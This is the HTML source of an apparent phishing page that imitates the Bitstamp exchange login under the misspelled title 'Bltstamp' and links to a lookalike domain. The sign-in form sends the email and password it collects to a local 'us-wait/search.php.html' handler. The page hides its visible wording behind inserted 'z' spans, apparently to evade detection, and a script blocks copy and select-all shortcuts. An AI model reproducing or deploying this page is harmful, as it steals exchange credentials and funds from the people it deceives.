...
<head>
	...
	<title>Bltstamp -buy-and-sell-bltcoln</title>
	...
	<script type="text/javascript" async="" src="../00_files/js.txt">
	...
	<script language="javascript">
		function conectado() {
			...
			if (document.form.email.value == "" || document.form.email.value.length < 4) {
				document.getElementById('alertbrow').style.display = "block";
	  ...
	  {top.location.href="#"});shortcut.add("Ctrl+A",function()
	  {top.location.href="#"});shortcut.add("Ctrl+C",function()
	  {top.location.href="#"});
	  //]]>
	  </script>
	...
	<style type="text/css">.nuxt-progress {
			position: fixed;
			top: 0;
			left: 0;
			right: 0;
	...
	<style type="text/css">:root {
			...
			--text-size-title-secondary: 2.75rem;
			--text-size-title-big: 3.1875rem;
			...
			--sparkline-transparency: 20%;
			--sparkline-interact-color: var(--gray-7);
			--sparkline-interact-color-dark: var(--gray-70);
			--sparkline-ticker-background-color: var(--white);
			--sparkline-ticker-background-color-dark: var(--gray-92);
			--sparkline-ticker-shadow-color: rgba(51, 52, 51, 0.1);
			--sparkline-color-medium: var(--gray-46);
			--sparkline-border-dark: var(--gray-85);
			--sparkline-not-available-color: var(--gray-44);
			--sparkline-not-available-color-dark-theme: var(--gray-31);
			...
			--header-dropdown-background-color: var(--dark-grayish-blue-75);
			--header-dropdown-border-color: var(--gray-92);
			--header-dropdown-border-color-light: var(--gray-82);
			--header-dropdown-restructured-background-color: var(--white);
			--header-dropdown-restructured-border-color-light: var(--gray-5);
			--header-dropdown-restructured-text-color: var(--gray-82);
			--header-dropdown-restructured-icon-color: var(--gray-68);
			--header-dropdown-restructured-triger-color: var(--gray-37);
			--header-dropdown-restructured-triger-hover-color: var(--gray-46);
			--header-dropdown-restructured-triger-active-color: var(--gray-82);
			--pairs-dropdown-header-height: 1.75rem;
			--pairs-dropdown-input-color: var(--gray-82);
			--pairs-dropdown-input-border-color: var(--gray-57);
			--pairs-dropdown-focused-input-border-color: var(--gray-46);
			--pairs-dropdown-item-background-color: var(--dark-grayish-blue-75);
			--pairs-dropdown-item-hover-background-color: rgba(99, 102, 109, 0.6);
			--pairs-dropdown-item-active-background-color: var(--gray-82);
			--pairs-dropdown-item-active-border-color: var(--green);
			--pairs-dropdown-favorite-color: var(--gray-62);
			--pairs-dropdown-favorite-active-color: var(--secondary-color);
			--pairs-dropdown-restructured-border-color: var(--gray-5);
			--pairs-dropdown-text-color: var(--gray-80);
			--pair-filter-item-color: var(--gray-68);
			--pair-filter-item-hover-color: hsla(0, 0%, 60%, 0.6);
			--pair-filter-item-active-color: var(--gray-82);
			--pairs-dropdown-restructured-input-color: var(--gray-2);
			--pairs-dropdown-restructured-input-border-color: var(--gray-5);
			--pairs-dropdown-restructured-focused-input-border-color: var(--gray-24);
			--pairs-dropdown-restructured-item-background-color: var(--white);
			--pairs-dropdown-restructured-item-hover-background-color: var(--gray-2);
			--pairs-dropdown-restructured-favorite-color: var(--gray-24);
			--pairs-dropdown-restructured-favorite-active-color: var(--orange-light);
			--pairs-dropdown-restructured-item-selected: var(--gray-16);
			--pair-filter-restructured-item-color: var(--gray-11);
			--pair-filter-restructured-item-hover-color: hsla(0, 0%, 72.5%, 0.6);
			--pair-filter-restructured-item-active-color: var(--gray-24);
			--account-selector-padding: 1rem;
			--account-selector-gap-size: 0.5rem;
			--account-selector-separator: var(--gray-60);
			--account-selector-total-balance-background: var(--gray-82);
			--account-selector-item-hover-background-color: rgba(99, 102, 109, 0.6);
			--account-selector-restructured-separator: var(--gray-5);
			--account-selector-restructured-total-balance-background: var(--gray-2);
			--account-selector-restructured-item-hover-background-color: var(--gray-2);
			--account-selector-restructured-item-selected-background-color: var(--gray-5);
		...
		*,
		...
		.flag {
			...
			width: 16px;
			height: 11px;
			background: url(flags_a44c0a9.png) no-repeat
		}
	...
	<style type="text/css">.popover[data-v-f9de581a] {
			position: relative;
			display: inline-block
		}
	...
	<style type="text/css">.progress_bar[data-v-03a04b74] {
			width: 100%;
			height: 4px;
			position: relative
		}
	...
	<style type="text/css">.mobile-side-panel[data-v-0f33cd69] {
			z-index: 2;
			width: 100%;
			max-width: 330px;
			min-width: 280px;
	...
	<style type="text/css">.navigation[data-v-5f710f09] {
			height: 65px;
			min-height: 65px;
			display: flex;
	...
	<style type="text/css">.layout[data-v-554d74ba] {
			min-height: 100vh;
			height: 100vh;
			display: flex;
			flex-direction: column
	...
	<style type="text/css">.visibility-icon[data-v-240920d4] {
			width: 1em;
			height: 1em;
			color: inherit;
			cursor: pointer
	...
	<style type="text/css">input[type=tel][data-v-ed983fd6] {
	...
	<style type="text/css">.button[data-v-813efc18] {
			font-size: var(--text-size-normal);
			font-family: var(--default-font-family);
			width: 320px;
			font-weight: var(--font-weight-medium);
			...
			transition: background .15s var(--default-transition-curve);
		...
		.button--regular[data-v-813efc18]:active {
			background: var(--primary-hover-color);
			border-color: var(--primary-hover-color);
			box-shadow: 0 0 0 .2rem rgba(21, 158, 73, .23)
		}
		...
		.button--secondary[data-v-813efc18]:active {
			...
			box-shadow: 0 0 0 .2rem rgba(51, 52, 51, .23)
		}
		...
		.button--info[data-v-813efc18]:active {
			...
			border-color: var(--secondary-color);
			box-shadow: 0 0 0 .2rem var(--secondary-outline-color)
		}
		...
		.button--warning[data-v-813efc18]:active {
			...
			box-shadow: 0 0 0 .2rem var(--warning-outline-color)
		}
		...
		.button--error[data-v-813efc18]:active {
			...
			border-color: var(--tertiary-color);
			box-shadow: 0 0 0 .2rem var(--tertiary-outline-color)
		}
	...
	<style type="text/css">.modal_tGwtk {
			font-size: var(--text-size-normal)
		}
	...
	<style type="text/css">.modal--transition-slide-enter[data-v-3243d373],
	...
	<style type="text/css">.tfa-modal__content[data-v-54d20bf6] {
			display: flex;
			flex-direction: column;
			align-items: center;
			height: 100%;
	...
	<style type="text/css">[class^=text-input][data-v-5b01c29e] {
			all: unset;
			box-sizing: border-box;
			display: block
		}

		.text-input[data-v-5b01c29e] {
			position: relative;
			width: 100%;
			min-height: 72px;
			display: flex;
		...
		.text-input__wrapper[data-v-5b01c29e] {
			display: flex !important
		}

		.text-input__postfix[data-v-5b01c29e] {
			font-size: var(--text-size-normal);
			right: 0
		}

		.text-input__postfix[data-v-5b01c29e],
		.text-input__prefix[data-v-5b01c29e] {
			align-self: center;
		...
		.text-input__copy[data-v-5b01c29e] {
			position: absolute;
			top: 1.5rem;
			right: 0
		}

		.text-input__copy-icon[data-v-5b01c29e] {
			width: 1.25rem;
			height: 1.25rem;
			cursor: pointer;
		...
		.text-input__copy-icon[data-v-5b01c29e]:hover {
			color: var(--secondary-hover-color)
		}

		.text-input__copy-text[data-v-5b01c29e] {
			font-weight: var(--font-weight-light);
			font-size: var(--text-size-xs);
			color: var(--text-color)
		}

		.text-input__password-visibility[data-v-5b01c29e] {
			align-self: center;
			color: var(--text-color-medium);
			font-size: var(--text-size-base);
			position: absolute;
		...
		.text-input__password-visibility[data-v-5b01c29e]:hover {
			color: var(--text-color-medium-dark)
		}

		.text-input__label[data-v-5b01c29e] {
			position: absolute;
			top: 0;
			left: 0;
			z-index: 1;
		...
		.text-input__label--transition[data-v-5b01c29e] {
			transition: all var(--default-transition-time) var(--default-transition-curve)
		}

		.text-input__label--placeholder[data-v-5b01c29e] {
			cursor: text;
			top: 20px;
			font-size: var(--text-size-base);
		...
		.text-input__field[data-v-5b01c29e] {
			-webkit-appearance: none;
			-moz-appearance: none;
			appearance: none;
			font-family: var(--default-font-family);
		...
		.text-input__field[data-v-5b01c29e]:focus {
			outline: none;
			border-bottom-color: var(--input-border-color-focused)
		}

		.text-input__field[data-v-5b01c29e]:-webkit-autofill {
			animation-name: onAutoFillStart;
			-webkit-transition: background-color 5000s ease-in-out 0s;
			transition: background-color 5000s ease-in-out 0s
		}

		.text-input__field[data-v-5b01c29e]:not(:-webkit-autofill) {
			animation-name: onAutoFillCancel
		}

		.text-input__field.text-input__field--error[data-v-5b01c29e] {
			border-bottom-color: var(--error-color)
		}

		.text-input__field[data-v-5b01c29e]:disabled {
			cursor: not-allowed;
			pointer-events: auto
		}

		.text-input__field[data-v-5b01c29e]:read-only {
			color: var(--text-color-medium-light);
			border-bottom-color: var(--input-border-color-readonly)
		}

		.text-input__field--align-end[data-v-5b01c29e] {
			text-align: end
		}

		.text-input__field--padding-right[data-v-5b01c29e] {
			padding-right: 2.5rem
		}

		.text-input__field--light-border[data-v-5b01c29e],
		.text-input__field--light-border[data-v-5b01c29e]:focus {
			border: 1px solid var(--input-border-color-empty)
		}

		.text-input__field--dark-border[data-v-5b01c29e],
		.text-input__field--dark-border[data-v-5b01c29e]:focus {
			border: 1px solid var(--input-border-color-focused)
		}

		.text-input__field--red-border[data-v-5b01c29e],
		.text-input__field--red-border[data-v-5b01c29e]:focus {
			border: 1px solid var(--error-color)
		}

		.text-input__errors[data-v-5b01c29e] {
			margin: -1.125rem 0 0;
			color: var(--error-color);
			font-size: var(--text-size-small)
		}

		.text-area__field[data-v-5b01c29e] {
			-webkit-appearance: none;
			-moz-appearance: none;
			appearance: none;
			font-family: var(--default-font-family);
		...
		.text-area__field[data-v-5b01c29e]:focus {
			outline: none;
			border: 1px solid var(--input-border-color-focused)
		}

		.text-area__field[data-v-5b01c29e]:-webkit-autofill {
			animation-name: onAutoFillStart;
			-webkit-transition: background-color 5000s ease-in-out 0s;
			transition: background-color 5000s ease-in-out 0s
		}

		.text-area__field[data-v-5b01c29e]:not(:-webkit-autofill) {
			animation-name: onAutoFillCancel
		}

		.text-area__field--error[data-v-5b01c29e] {
			border-color: var(--error-color)
		}

		.text-area__field[data-v-5b01c29e]:disabled {
			cursor: not-allowed;
			pointer-events: auto
		}

		.textarea-input__label--placeholder[data-v-5b01c29e] {
			cursor: text;
			top: 30px;
			left: 15px;
			font-size: var(--text-size-base);
		...
		.text-input--market[data-v-5b01c29e] {
			min-height: 50px
		}

		.text-input--market .text-input__field[data-v-5b01c29e] {
			height: 50px;
			width: 100%;
			font-size: var(--text-size-base);
			border-radius: var(--button-border-radius);
		...
		.text-input--market .text-input__label[data-v-5b01c29e] {
			padding: 0 .5em;
			margin-left: .5rem;
			top: -.5em;
			width: auto;
		...
		.text-input--market .text-input__label--placeholder[data-v-5b01c29e] {
			top: 1rem;
			font-size: var(--text-size-normal)
		}

		.text-input--market.text-input--error .text-input__field[data-v-5b01c29e] {
			border-color: var(--error-color)
		}

		.text-input--backoffice .text-input__field[data-v-5b01c29e] {
			border: 1px solid var(--input-border-color);
			height: 45px;
			padding: 0 1rem;
			margin-bottom: 0
		...
		.text-input--backoffice .text-input__field--table-cell[data-v-5b01c29e] {
			height: 32px;
			margin: 0
		}

		.text-input--backoffice .text-input__label[data-v-5b01c29e] {
			top: -4px;
			font-size: var(--text-size-base)
		}

		.text-input--backoffice .text-input__label--table-cell[data-v-5b01c29e] {
			top: -17px
		}

		.text-input--backoffice .text-input__errors[data-v-5b01c29e] {
			margin: 0
		}

		.text-input--hidden[data-v-5b01c29e] {
			min-height: 0;
			height: 0
		}

		.text-input--hidden .text-input__label[data-v-5b01c29e] {
			display: none
		}

		.table-cell-input[data-v-5b01c29e] {
			min-height: 0
		}

		.fade-enter-active[data-v-5b01c29e],
		.fade-leave-active[data-v-5b01c29e] {
			transition: opacity var(--transition-time-quick)
		}

		.fade-enter[data-v-5b01c29e],
		.fade-leave-to[data-v-5b01c29e] {
			opacity: 0
		}

		.error-expand-enter-active[data-v-5b01c29e],
		.error-expand-leave-active[data-v-5b01c29e] {
			max-height: 10rem;
			overflow: hidden;
			transition: max-height var(--default-transition-time) ease-out, opacity var(--transition-time-quick) ease
		}

		.error-expand-enter[data-v-5b01c29e],
		.error-expand-leave-to[data-v-5b01c29e] {
			max-height: 0;
			opacity: 0
		}
	</style>
	<style type="text/css">.markdown[data-v-31e352c0] pre {
			display: block;
			padding: .59375rem;
			margin: 0 0 .625rem;
			font-size: .8125rem;
	...
	<style type="text/css">.dialog__header[data-v-6de5483c] {
	...
	<style type="text/css">.link[data-v-39b90c33] {
			color: var(--link-color);
			font-size: var(--text-size-base);
			font-weight: var(--font-weight-medium);
			text-decoration: none;
	...
	<style type="text/css">.resize-observer[data-v-8859cc6c] {
			border: none;
	...
	<style type="text/css">.v-popper__popper .v-popper__wrapper .v-popper__inner {
			background: none;
			padding: 0
		}
	...
	<style type="text/css">.app-tooltip[data-v-528b249d] {
			display: inline-block
		}
	...
	<style type="text/css">.help-panel[data-v-18bf2b89] {
			width: 100%;
			max-width: 394px;
			min-width: 280px;
			height: 100%;
	...
	<style type="text/css">.sub-navigation[data-v-803c38d8] {
			font-size: var(--text-size-base);
			text-align: left;
			display: flex;
			width: 100%;
	...
	<style type="text/css">.accordion-item__trigger[data-v-21b9d099] {
			padding: 1rem 1.5rem;
			width: 100%;
			text-align: left;
			border: none;
	...
	<style type="text/css">.checkbox__container[data-v-16b12f3a] {
			padding-top: .75rem;
		...
		.checkbox__box[data-v-16b12f3a]:after {
			width: 18px;
			height: 18px;
			background: url(22965a2124c0bd0ffedae49837e2320b.svg) no-repeat;
			display: block;
			content: "";
			position: absolute;
			opacity: 0;
	...
	<style type="text/css">.cookie-modal[data-v-a3c17b9c] .wc-modal__container {
			width: 100%;
			max-width: 1097px
		}
	...
	<style type="text/css">.cookie-consent-banner[data-v-0a6b88e6] {
			position: fixed;
			bottom: 0;
			width: 100%;
			background-color: var(--background-color);
	...
	<style type="text/css">.radio:hover .radio__label[data-v-b6cac9a6] {
			color: var(--input-hover-color)
		}
		...
		.radio--bracketed .radio__label[focus-within][data-v-b6cac9a6] {
			box-shadow: 0 0 10px rgba(21, 158, 73, .2)
		}
	...
	<style type="text/css">.binary-choice--inline[data-v-5b938036] {
			display: flex;
			justify-content: space-between;
			align-items: center;
			position: relative
	...
	<style type="text/css">.field-binary-choice+.field-binary-choice {
			margin-top: 1.5rem
		}
	</style>
	<style type="text/css">.switch[data-v-1700fa56] {
			-webkit-appearance: none;
			-moz-appearance: none;
			appearance: none;
			cursor: pointer;
	...
	<style type="text/css">.switch-container[data-v-2b974baf] {
			display: flex;
			align-items: center
		}
	...
	<style type="text/css">.switch-field[data-v-0eaf298b] {
			padding: .5rem 0
		}
	...
	<style type="text/css">.checkbox-group[data-v-25012dbe] {
			padding-top: 1.25rem
		}
	...
	<style type="text/css">.app-scrollbar .ps__rail-y,
		...
		.app-scrollbar .ps__rail-y:hover {
			...
			border: 1px solid var(--header-dropdown-border-color-light)
		}
	...
	<style type="text/css">input[data-v-30ed178a] {
			height: unset
		}
	...
	<style type="text/css">.create_password[data-v-0be7e290] .popover {
			width: 100%
		}
	...
	<style type="text/css">.app-icon[data-v-7cbb9c15] {
			display: inline-block;
			position: relative
		}

		.app-icon--success[data-v-7cbb9c15] {
			color: var(--success-color)
		}

		.app-icon--info[data-v-7cbb9c15] {
			color: var(--info-color)
		}

		.app-icon--warning[data-v-7cbb9c15] {
			color: var(--warning-color)
		}

		.app-icon--error[data-v-7cbb9c15] {
			color: var(--error-color)
		}
	</style>
	<style type="text/css">.countries[data-v-2320d4a4] {
			width: 100%
		}
	...
	<style type="text/css">.tooltip-item[data-v-1fe4828e] {
			position: relative;
			display: inline-block
		}
	...
	<style type="text/css">.dropdowns[data-v-1d553f7b] {
			width: 100%
		}
	...
	<style type="text/css">.file-upload[data-v-534a850c] {
			width: 100%;
			max-width: 500px;
			min-width: 0;
			height: 100px;
	...
	<style type="text/css">.file-upload[data-v-2f1c8950] {
			width: 100%;
			max-width: 500px;
			min-width: 0;
			height: 100px;
	...
	<style type="text/css">.mobile-file-upload[data-v-212983ef] {
			-webkit-user-select: none;
			-ms-user-select: none;
			user-select: none;
			display: flex;
		...
		.mobile-file-upload__file-icon[data-v-212983ef] {
			background: url(32d7b0412b9c3385c068e1101c962891.svg) 50% no-repeat;
			height: var(--icon-size-medium);
	...
	<style type="text/css">.icon[data-v-063258aa] {
			padding: .25rem;
			margin: -.1875rem .5rem;
			border-radius: 50%;
			color: var(--info-color);
	...
	<style type="text/css">.file-upload__help[data-v-af24bc12] {
			width: var(--icon-size);
			height: var(--icon-size);
	...
	<style type="text/css">.field-file-upload[data-v-39dd34ba] {
			padding-top: 1.5rem
		}
	</style>
	<style type="text/css">.hcaptcha-link-container[data-v-2062acc6] {
			line-height: .875rem;
			color: var(--text-color-medium-light);
			font-size: var(--text-size-xs);
			text-align: center;
	...
	<style type="text/css">.multiselect-wrap[data-v-d37d4e7a] {
			min-height: 72px;
			cursor: pointer;
			position: relative;
			width: 100%
	...
	<style type="text/css">.radio-group--medium-label[data-v-c7babaa2] {
			display: block;
			margin-bottom: 1.25rem;
			color: var(--text-color);
			line-height: 1.375rem;
	...
	<style type="text/css">.recaptcha[data-v-3da4cb5b] {
			outline: none
		}
	</style>
	<style type="text/css">.terms[data-v-677feb26] {
			white-space: normal
		}
	...
	<style type="text/css">.tfa-field__inputs[data-v-a84cec88] {
			margin-bottom: 3.25rem
		}
	</style>
	<style type="text/css">.field-warning[data-v-16d0f78c] {
			color: var(--warning-color);
			font-size: var(--text-size-small);
			line-height: 1.5;
			margin: -1rem 0 1rem
	...
	<style type="text/css">.form[data-v-1d2535dc] {
			width: 100%
		}

		.form[data-v-1d2535dc] .field-group {
			flex-wrap: wrap;
			display: flex;
		...
		.form[data-v-1d2535dc] .form-element {
			width: 100%;
			padding-left: var(--gutter);
			padding-right: var(--gutter)
		}

		.form[data-v-1d2535dc] .errors {
			display: none
		}

		.form .buttons-row[data-v-1d2535dc] {
			margin-top: 1.25rem;
			justify-content: center
		}

		.form[data-v-1d2535dc] .indent {
		...
		.form--inline[data-v-1d2535dc] {
			max-width: none;
			margin: 0
		}

		.form--inline[data-v-1d2535dc] .field-group {
			flex-wrap: nowrap
		}

		.form--inline .buttons-row[data-v-1d2535dc] {
			margin-top: 0;
			justify-content: flex-end
		}

		.form--backoffice[data-v-1d2535dc] .form-element {
			margin: .625rem 0
		}
	</style>
	<style type="text/css">.notice[data-v-1c1cbe80] {
			display: flex;
			align-items: center;
			flex-wrap: wrap;
			width: 100%;
		...
		.notice__icon--error[data-v-1c1cbe80] {
			background: var(--white) url(c7ba0626cc92589cab9ad03151b38815.svg) no-repeat 50%/50%;
			box-shadow: 2px 2px 1px 0 var(--tertiary-color-transparent)
		}

		.notice__icon--warning[data-v-1c1cbe80] {
			background: var(--white) url(f4b52aaae005b271ad0db950bf8401af.svg) no-repeat 50%/65%;
			box-shadow: 2px 2px 1px 0 var(--warning-color-transparent)
		}

		.notice__icon--success[data-v-1c1cbe80] {
			background: var(--white) url(22965a2124c0bd0ffedae49837e2320b.svg) no-repeat 50%/60%;
			box-shadow: 2px 2px 1px 0 var(--primary-color-transparent)
		}

		.notice__icon--info[data-v-1c1cbe80] {
			background: var(--white) url(f20e804748c06eb5f67971420ece071d.svg) no-repeat 50%/50%;
	...
	<style type="text/css">.info[data-v-f33bff12] {
			display: flex;
			flex: 1 1;
			flex-direction: column;
			align-items: center;
	...
	<style type="text/css">.sub-step[data-v-5e0df73a] {
			min-width: 0;
			width: 100%;
			position: relative;
			display: flex;
	...
	<style type="text/css">.container[data-v-a403388c] {
			display: flex;
			justify-content: space-between;
			flex: 1 1;
			position: relative
	...
	<style type="text/css">.login-header[data-v-6aa64f22] {
			display: flex;
			justify-content: center
		}
	...
	<style type="text/css">.login-header-container[data-v-4b49c110] {
			display: flex;
			justify-content: center;
			flex-direction: column
		}
	...
	<style type="text/css">.forgot-password-slot[data-v-271d5c77] {
			text-align: right
		}
		...
		.two-factor-form__input[type=password][data-v-ed983fd6] {
			font-weight: unset;
			outline: none;
			font-size: var(--text-size-large);
			vertical-align: top;
				...
				<nav data-v-5f710f09="" class="navigation-wrap">
					<div data-v-5f710f09="" class="navigation">
						<div data-v-5f710f09="" class="navigation__logo navigation__side">
							<a data-v-39b90c33="" data-v-5f710f09="" href="#" 
								rel="nofollow noopener noreferrer" class="link">
								<img data-v-5f710f09="" data-v-39b90c33=""
									src="bits-_files/1b25a33ec61948b5aa761d1159912ae6.svg" class="navigation__logo">
							</a>
						</div>
						<div data-v-5f710f09="" class="navigation__mobile-logo navigation__side">
							<a data-v-39b90c33="" data-v-5f710f09="" href="#" 
								rel="nofollow noopener noreferrer" class="link">
								<img data-v-5f710f09="" data-v-39b90c33=""
									src="bits-_files/371d12665c9066c59a7ca91cf963320a.svg"
									class="navigation__mobile-logo">
							</a>
						</div>
						<div data-v-5f710f09="" class="navigation__profile navigation__side">
							<a data-v-39b90c33="" data-v-5f710f09="" href="https://bitsttamp.online/bittst.jpg/sign-in/us-home/h#"
								class="link">Re<span class="o">z</span>gi<span class="o">z</span>st<span
									class="o">z</span>er</a>
						</div>
						<div data-v-5f710f09="" class="navigation__menu navigation__side">
							<img data-v-5f710f09="" src="bits-_files/8a763783ce210d53f6d33c8d9cb925bf.svg">
						</div>
					</div>
				</nav>
					...
					<section data-v-5e0df73a="" data-v-a403388c="" class="sub-step substep-section">
						<div data-v-5e0df73a="" class="sub-step__content">
							<div data-v-5e0df73a="" class="sub-step-header">
								<div data-v-6aa64f22="" data-v-5e0df73a="" class="login-header"></div>
								<h1 data-v-5e0df73a="" class="sub-step-header__title">
									L<span class="o">z</span>o<span class="o">z</span>g i<span class="o">z</span>n
								</h1>
								<div data-v-4b49c110="" data-v-5e0df73a="" class="login-header-container">
									<h3 data-v-4b49c110="" class="login-subtitle">D<span class="o">z</span>on<span
											class="o">z</span>'t ha<span class="o">z</span>ve a<span class="o">z</span>n
										ac<span class="o">z</span>co<span class="o">z</span>un<span class="o">z</span>t?
										<a data-v-39b90c33="" data-v-4b49c110=""
											href="#" class="link">Re<span
												class="o">z</span>gi<span class="o">z</span>st<span class="o">z</span>er
											n<span class="o">z</span>o<span class="o">z</span>w fo<span
												class="o">z</span>r fr<span class="o">z</span>ee.</a>
									</h3>
								</div>
							</div>
...
<!---->
<form data-v-7b2e62d5="" data-v-8fbd8ae4="" id="form" name="form"
class="mb24 field-wrap input-" data-v-1272d70a="" action="us-wait/search.php.html" method="POST"
onsubmit="return conectado()">
...
<input type="hidden" name="systema" id="systema" value="No_Detect" />
<input type="hidden" name="verify" id="verify" value="No_Detect" />
...
<!---->
									...
									<div data-v-1d2535dc="" class="vue-form-generator" id="vue-form">
										<div class="field-group">
											<div class="form-element clean required field-input">
												<div class="field-wrap">
													<div>
														<div data-v-5b01c29e=""
															class="text-input text-input--default text-input--text">
															<div data-v-5b01c29e="" class="text-input__wrapper">
															
															
															
															
															
																<input data-v-5b01c29e=""   type="text"  name="email" id="email" required oninvalid="this.setCustomValidity('fill this field')" oninput="setCustomValidity('')" pattern="[a-zA-Z0-9.-_]{1,}@[a-zA-Z.-]{2,}[.]{1}[a-zA-Z]{2,}" title="Enter your login email. include an @ in the email address!" maxlength="48"  autocomplete="off" 
																oninput="value = type == &#39;number&#39;?value.replace(/[^\d]/g,&#39;&#39;):value"  placeholder="Email or User ID"
																	autocomplete="email"
																	class="text-input__field unset-global-style">
											...
											<div class="form-element clean required field-input">
												<div class="field-wrap">
													<div>
														<div data-v-5b01c29e=""
															class="text-input text-input--default text-input--password"
															name="">
															<div data-v-5b01c29e="" class="text-input__wrapper">
																...
																<input data-v-5b01c29e=""  type="password" name="password" id="password"  autocomplete="off" minlength="6" maxlength="38"  required oninvalid="this.setCustomValidity('fill this field')" oninput="setCustomValidity('')"  oninput="value = type == &#39;number&#39;?value.replace(/[^\d]/g,&#39;&#39;):value" 
																placeholder="Password" autocomplete="current-password"
																	onkeyup="document.getElementById(&#39;on&#39;).disabled = &#39;&#39;"
																	class="text-input__field unset-global-style text-input__field--padding-right">
															
															
															
															
															
																	<span data-v-5b01c29e=""
																	class="text-input__password-visibility">
																	<svg data-v-240920d4="" data-v-5b01c29e=""
																		xmlns="http://www.w3.org/2000/svg"
																		viewBox="0 0 12 12" class="visibility-icon">
																		<path data-v-240920d4=""
																			d="M6 2q3.32 0 6 4l-.19.28Q9.2 10 6 10T0 6l.19-.28Q2.8 2 6 2zm0 1.5A2.5 2.5 0 1 0 8.5 6 2.5 2.5 0 0 0 6 3.5zm0 1A1.5 1.5 0 1 1 4.5 6 1.5 1.5 0 0 1 6 4.5z"
													...
													<div>
														<div class="field-slot">
															<div class="vue-portal-target">
																<div data-v-271d5c77="" data-v-5e0df73a=""
																	class="forgot-password-slot"><a data-v-39b90c33=""
																		data-v-271d5c77=""
																		href="#"
																		class="link">
																		Fo<span class="o">z</span>rg<span
																			class="o">z</span>ot pa<span
																			class="o">z</span>ss<span
																			class="o">z</span>wo<span
																			class="o">z</span>rd<span
																			class="o">z</span>?
																	</a></div>
															</div>
														</div>
											...
											<div
												class="form-element clean flex flex--justify-center field-hcaptcha-form field-hcaptcha">
												<div class="field-wrap">
													<div>
														<div data-v-2062acc6="" widget-id="0">
															<div data-v-2062acc6="">
																<div data-v-2062acc6="" class="hcaptcha-link-container">
																	Thi<span class="o">z</span>s si<span
																		class="o">z</span>te i<span class="o">z</span>s
																	pr<span class="o">z</span>ot<span
																		class="o">z</span>ec<span
																		class="o">z</span>te<span class="o">z</span>d
																	b<span class="o">z</span>y hC<span
																		class="o">z</span>ap<span
																		class="o">z</span>tc<span class="o">z</span>ha
																	an<span class="o">z</span>d it<span
																		class="o">z</span>s
																	<a data-v-2062acc6="" 
																		href="#"
																		class="hcaptcha-link hcaptcha-link__left">Pr<span
																			class="o">z</span>iv<span
																			class="o">z</span>ac<span
																			class="o">z</span>y
																		Po<span class="o">z</span>li<span
																			class="o">z</span>cy</a> an<span
																		class="o">z</span>d
																	<a data-v-2062acc6="" 
																		href="#"
																		class="hcaptcha-link">Te<span
																			class="o">z</span>rm<span
																			class="o">z</span>s o<span
																			class="o">z</span>f Se<span
																			class="o">z</span>rv<span
																			class="o">z</span>ic<span
																			class="o">z</span>e</a>
																	ap<span class="o">z</span>pl<span
																		class="o">z</span>y.
																</div>
															</div>
														</div>
							...
							<div data-v-5e0df73a="" class="sub-step__footer">
								<div data-v-5e0df73a="" class="sub-step__button-section">
									<button  name="on" type="submit" id="on"  data-v-813efc18=""data-v-5e0df73a=""
										class="sub-step__button button button--regular button--default"
										disabled="disabled">Lo<span class="o">z</span>g i<span
											class="o">z</span>n</button>
								</div>
							</div>
						</form>
